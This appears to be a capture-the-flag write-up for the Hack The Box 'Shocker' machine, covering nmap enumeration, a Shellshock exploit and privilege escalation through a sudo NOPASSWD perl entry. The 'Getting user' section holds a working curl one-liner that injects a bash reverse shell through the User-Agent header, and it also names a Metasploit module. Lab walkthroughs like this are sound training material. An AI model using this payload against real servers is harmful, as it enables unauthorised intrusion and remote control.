## Enumeration


### Nmap scan

I started my enumeration with an nmap scan of `10.10.10.56`.

The options I regularly use are:

| `Flag` | Purpose |
| :--- | :--- |
| `-p-` | A shortcut which tells nmap to scan all ports |
| `-vvv` | Gives very verbose output so I can see the results as they are found, and also includes some information not normally shown |
| `-sC` | Equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target |
| `-sV` | Does a service version scan |
| `-oA $name` | Saves all three formats \(standard, greppable, and XML\) of output with a filename of `$name` |

$ nmap -sC -sV 10.10.10.56 -oA nmap/default

### Getting user

Atleast now we can confirm we have shellshock, we can run metasploit against the file and gain a shell or we can use a one liner to get a reverse shell.
If we go with metasploit, we will use: `exploit/multi/http/apache_mod_cgi_bash_env_exec`
But instead of using metasploit we will use a quick one liner to gain a shell.

`curl -H "user-agent: () { :; }; echo; echo; /bin/bash -i >& /dev/tcp/IP/4444 0>&1" \ 10.10.10.56/cgi-bin/user.sh`

![](../../assets/img/htb/Shocker/user.png)


## Road2r00t

Nice, now we have a reverse shell. The first thing I always do when I get access as a user on a linux machine is do manual enumeration.
I usually always do `sudo -l` so lets try it.

```
(remote) shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

Ok, this is very simple, we can navigate to <https://gtfobins.github.io/> and look for perl priv esc.
We find the necessary one we want to use, in this case it's sudo.

![](../../assets/img/htb/Shocker/gtfobins.png)

Let's run this on the machine and get r00t.

![](../../assets/img/htb/Shocker/root.png)

There we go, we have got uid0.
